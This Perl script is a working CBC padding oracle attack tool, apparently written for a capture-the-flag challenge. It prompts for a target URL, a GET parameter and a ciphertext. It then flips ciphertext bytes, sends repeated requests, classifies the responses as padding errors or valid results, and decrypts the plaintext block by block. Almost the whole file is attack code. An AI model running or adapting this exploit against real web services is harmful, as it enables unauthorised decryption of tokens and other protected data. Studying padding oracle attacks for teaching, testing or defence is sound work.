#!/usr/bin/env perl
use strict;
use warnings;
use HTTP::Tiny;# https://perldoc.perl.org/HTTP/Tiny.html
use MIME::Base64; 
use URI::Escape;#  http://search.cpan.org/perldoc/URI::Escape
use Encode qw(decode encode);
use List::MoreUtils qw(any);
use Config::Tiny; # https://metacpan.org/pod/Config::Tiny
use Digest::SHA  qw(sha256_base64); # https://metacpan.org/pod/Digest::SHA1; other hashing functions??

print "Ich beginne\n";

# Variable initializations
my @text = (), my @guuud = (), my @paddingErrors = ();
my $url, my $parm, my $bSize, my $URLEncoding, my $AIM;
my $file = "./options.config";
my $config = Config::Tiny->read($file);
if ($config){ $url = $config->{section}->{url}, $parm =  $config->{section}->{parm}, $bSize = $config->{section}->{bSize}, $URLEncoding = $config->{section}->{URLEncoding}; }
else{
    my $config = Config::Tiny->new;
    print "\nEnter the URL to attack: ";                                                                                                                                                           chomp($url = <STDIN>); 
    print "\nEnter the GET parameter to attack: ";                                                                                                                                      chomp ($url = $url."/?".<STDIN>); $url = $url.'=';
    print "\nEnter your CBC cipher text: ";                                                                                                                                                     chomp ($parm = <STDIN>);
    print "\nEnter your cipher text block size: ";                                                                                                                                          chomp ($bSize = <STDIN>);
    print "\n0 = plain base64\n1 = URL encoded base64\n2 = URL safe encoded base64\nEnter your choice: ";                  chomp ($URLEncoding = <STDIN>);
    $config->{section} = { url => $url, parm => $parm, bSize => $bSize, URLEncoding => $URLEncoding };
    $config->write($file);
}
if ( $URLEncoding == 1){ $parm = uri_unescape($parm); }
elsif ( $URLEncoding == 2){ $parm =~ s/-/+/ig; $parm =~ s/!/\//ig; $parm =~ s/~/=/ig; }
$parm = decode_base64($parm);
my $qLen = length($parm)-1;
#

print "String Length: ".$qLen."\n";

# Padding length
my $tempPARM = $parm;
my $it = 6;
my $currentB = $qLen-($bSize+$it);

# Add a way to allow users to preemptively add to the arrays
push @paddingErrors, "PaddingException", "bad";
push @guuud, "UnicodeDecodeError", "msg";
#

# Padding length
my $tempPARM = $parm; my $it = 6; my $currentB = $qLen-($bSize+$it);
substr($tempPARM, $currentB, 1) = chr(ord(substr($tempPARM, $currentB, 1))^255);
my $return = getRequest($tempPARM); my $limit = 0;
if ($return == 1){$it = 0; $limit = 5;}else{$it = $it + 2; $limit = $bSize+1;} # Make sure this works with other block sizes
while ($it < $limit){
    $tempPARM = $parm;
    $currentB = $qLen-($bSize+$it);
    substr($tempPARM, $currentB, 1) = chr(ord(substr($tempPARM, $currentB, 1))^255);
    $return = getRequest($tempPARM);
    if ($return == 1){ # Test  if using a ($return) statment works
        if ($it == 0){ $AIM = 0; }
        else{ 
            $tempPARM = $parm; $it--; $currentB = $qLen-($bSize+$it);
            substr($tempPARM, $currentB, 1) = chr(ord(substr($tempPARM, $currentB, 1))^255);
            $return = getRequest($tempPARM);
            if ($return == 1){ $AIM = $it; }
            else{ $AIM = $it+1; }}
        last;
    }else{ $it = $it + 2; }}

if ($it == $bSize+2){ $AIM = $bSize; }

my $ill = 0;
while ($ill < $AIM){
    push @text, $AIM;
    $ill++;
}
# $AIM equals the amount of padding
#

#my $state = 'state=324b26c2eeeb51c3191d212e44ab4670083$FLAG$", "id": "2", "key": "yrIoJt1shYp3XUP87-9eRA~~"}';
#my $sL = int(length($state)/16);
#my $lolll = length($state)%16;
#$qLen = $qLen-$bSize*$sL;
#$parm = substr($parm,  0, $qLen+1); # Added 1 because it starts from 1 instead of 0.



my $target = 0;
my $bNum = ($qLen+1)/$bSize;
print "\nInitial Padding Size = $AIM, Number of Blocks = $bNum\n\n";
my $bt = 0;

while ($bt < $bNum-1){ # fix jank fix
    $target = $AIM+1, $it = $AIM;
    while($it < $bSize){ findByte(); 
        my $tempP = "="x(($it+1)*5)." "x(($bSize-($it+1))*5); printf ("\r%d/%d {%s}",1+$it, $bSize, $tempP); }
    printf ("\rBlock %d/%d Complete                                                                          \n", 1+$bt, $bNum);
    $qLen = $qLen-$bSize;
    $parm = substr($parm,  0, $qLen+1); # Added 1 because it starts from 1 instead of 0.
    $bt++;
    $AIM = 0;
    printPlain();
}

print "Attack Complete! Your plain text: \n";
printPlain();

# End -----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

sub prep { # Preps padding for bit flipping (turns padding from something like \x03\x03\x03 to \x04\x04\x04)
    my $tilAIM = 0;
    while ($tilAIM < $AIM){
        $currentB = $qLen-($bSize+$tilAIM);
        substr($tempPARM, $currentB, 1) = chr(ord(substr($parm, $currentB, 1))^$target^$text[$tilAIM+$bt*$bSize]);
        $tilAIM++; }}

sub findByte {# Flips bits untill it get valid padding
    $tempPARM = $parm;
    prep( );
    $currentB = $qLen-($bSize+$it);
    my $ogByte = ord(substr($parm, $currentB, 1));
    my $tries = 0;
    power: foreach my $number (0 .. 255){
        substr($tempPARM, $currentB, 1) = chr($number);
        $return = getRequest($tempPARM);
        if ($return ){ my $xD = $number^$ogByte^$target; push @text, $xD; $AIM++; $target++; $it++; last; }}
    unless ( $return ){ while (1){ # Runs if 1 is never returned for any given byte
            print "\n\nCould not find padding for byte $currentB. Do you want to try again ($tries attempts)? (Y/n): ";
            chomp ( my $uinput = <STDIN> );
            if ( $uinput eq "Y" ){ $tries++; print "This should only take a few moments...\n"; goto power; }
            elsif ( $uinput eq "n" ){ die "Could not find byte $currentB!"; }
            else{ print 'Either type "Y" or "n"!'."\n"; }}}}

sub getRequest { # Send a get request and classify the response
    my $heel = encode_base64($_[0], '');
    if ( $URLEncoding == 1 ){ $heel = uri_escape($heel); }
    elsif ( $URLEncoding == 2) { $heel =~ s/\+/-/ig; $heel =~ s/\//!/ig; $heel =~ s/=/~/ig; }
    my $response = HTTP::Tiny->new->get($url.$heel);
    my $htmlResponse = sha256_base64($response->{content});
    if ( grep {$response->{content} =~ $_ } @paddingErrors ){
        return 0;
    }elsif( grep {$response->{content} =~ $_ } @guuud ){
        return 1;
    }else{ my $uinput; while(1){
            print "\n$url$heel\n\n1 = Padding Error\n2 = Other\n3 = Similar to previous\nEnter your choice: ";
            chomp ($uinput = <STDIN>);
            $uinput = $uinput+0; # Make this better
            if ($uinput == 2){
                print "\nInput a keyword to identify the HTML page: ";
                chomp (my $tempV = <STDIN>);
                push @guuud, $tempV;
                return 1;
            }elsif ($uinput == 1){
                print "\nInput a keyword to identify the padding error: ";
                chomp (my $tempV = <STDIN>);
                push @paddingErrors, $tempV;
                return 0;
            }else{ print "\nPlease input either \"1\",  \"2\", or \"3\" (You typed: $uinput)\n\n"; next; }}}}

sub printPlain { # Print plain text as acsii and hex (more encodings and options to be added)
    my @plainText = reverse(@text);
    foreach( @plainText ){ # temp fix for newlines
    if (chr($_) eq "\n"){ print '\n'; }else{ printf("%s", chr($_)); }}
    print "\n";
    my $iter = 0;
    foreach( @plainText ){
        if ( not $iter%16 ) { print "\n| "; }
        printf("0x%02X | ", $_);
        $iter++; } 
    print "\n\n"; }